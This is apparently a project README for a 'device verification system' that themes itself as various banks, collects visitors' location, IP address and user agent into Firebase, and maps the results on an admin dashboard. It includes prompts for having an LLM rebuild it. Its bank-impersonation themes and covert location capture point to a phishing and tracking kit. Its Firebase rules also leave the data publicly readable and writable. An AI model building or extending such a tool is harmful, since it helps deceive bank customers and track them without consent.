# Device Verification System with Theme Support

A sophisticated web application for device verification and location tracking, built using AI assistance through Large Language Models (LLMs). This project demonstrates how to create a secure, themeable banking-style verification system with admin capabilities.

## Overview

This application provides:
- Device verification interface with bank-grade security aesthetics
- Theme switching capability (supports multiple banking themes)
- Location tracking with fallback mechanisms
- Admin dashboard with interactive map visualization
- Secure data storage using Firebase Realtime Database

## Creating this Project with AI

This project was created using AI/LLM tools. Here's how you can recreate it:

### 1. Initial Setup Prompt

```
Create a device verification system with the following requirements:
- Professional banking-style interface
- Location verification capability
- Theme switching support
- Admin dashboard for viewing submissions
- Firebase integration for data storage
```

### 2. Core Components Creation

#### 2.1 Firebase Setup

```
Help me set up Firebase for this project with:

## Implementation Details

### 1. Firebase Configuration

```javascript
const firebaseConfig = {
    databaseURL: "your-database-url"
};
```

### 2. Security Rules

```json
{
  "rules": {
    ".read": true,
    ".write": true,
    "locations": {
      ".indexOn": ["timestamp"],
      "$location": {
        ".validate": "newData.hasChildren(['timestamp', 'userAgent', 'ip'])"
      }
    }
  }
}
```

### 3. Theme Configuration

```javascript
const themes = {
    bankName: {
        name: "Bank Name",
        logo: "./assets/logo.png",
        primaryColor: "#COLOR",
        secondaryColor: "#COLOR",
        styles: "themes/bank.css"
    }
};
```

## Setup Instructions

1. Create a Firebase project
2. Update Firebase configuration in script.js
3. Deploy Firebase security rules
4. Configure themes in themes/config.js
5. Add bank assets to assets/ directory
6. Deploy to web server
